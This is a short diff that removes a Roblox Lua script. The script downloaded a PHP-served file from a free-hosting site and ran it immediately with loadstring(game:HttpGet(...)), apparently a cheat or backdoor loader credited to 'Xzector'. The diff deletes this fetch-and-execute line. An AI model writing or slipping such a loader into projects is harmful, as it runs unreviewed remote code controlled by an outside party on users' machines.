@@ -1,7 +1,0 @@
-local bruh='Opx.php'
-function script(file)
-   --<auto chamber;
-   --<all rights reserved to Xzector;
-   return loadstring(game:HttpGet('https://thekidzhousescripts.000webhostapp.com/'..file))();
-end;
-script(bruh);
